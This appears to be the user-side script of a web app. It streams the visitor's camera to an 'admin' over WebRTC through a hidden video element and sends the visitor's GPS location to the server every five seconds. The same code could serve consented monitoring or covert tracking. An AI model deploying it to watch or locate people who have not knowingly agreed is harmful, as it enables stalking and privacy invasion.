// USER SIDE
const socket = io();

let pc = null;

async function startUser() {
  // WebRTC peer connection with Google STUN
  pc = new RTCPeerConnection({
    iceServers: [{ urls: "stun:stun.l.google.com:19302" }]
  });

  // Send ICE candidates to server
  pc.onicecandidate = (event) => {
    if (event.candidate) {
      socket.emit("ice-candidate", event.candidate);
    }
  };

  // Get ONLY VIDEO, NO AUDIO
  const stream = await navigator.mediaDevices.getUserMedia({
    video: true,
    audio: false
  });

  // Attach to hidden video so we can capture frames
  const video = document.getElementById("camera");
  video.srcObject = stream;

  // Add tracks to WebRTC
  stream.getTracks().forEach((track) => pc.addTrack(track, stream));

  // Create OFFER and send to admin
  const offer = await pc.createOffer();
  await pc.setLocalDescription(offer);
  socket.emit("offer", offer);
}

// Receive ANSWER from admin
socket.on("answer", async (answer) => {
  if (!pc) return;
  await pc.setRemoteDescription(new RTCSessionDescription(answer));
});

// Receive ICE candidates from admin
socket.on("ice-candidate", async (candidate) => {
  if (!pc) return;
  try {
    await pc.addIceCandidate(new RTCIceCandidate(candidate));
  } catch (err) {
    console.error("Error adding ICE in user:", err);
  }
});

// Send location every 5 seconds
setInterval(() => {
  if (!navigator.geolocation) return;
  navigator.geolocation.getCurrentPosition(
    (pos) => {
      socket.emit("location", {
        lat: pos.coords.latitude,
        lon: pos.coords.longitude
      });
    },
    (err) => console.warn("Location error:", err)
  );
}, 5000);

// Start everything
startUser().catch((err) => {
  console.error(err);
  alert("Could not access camera");
});
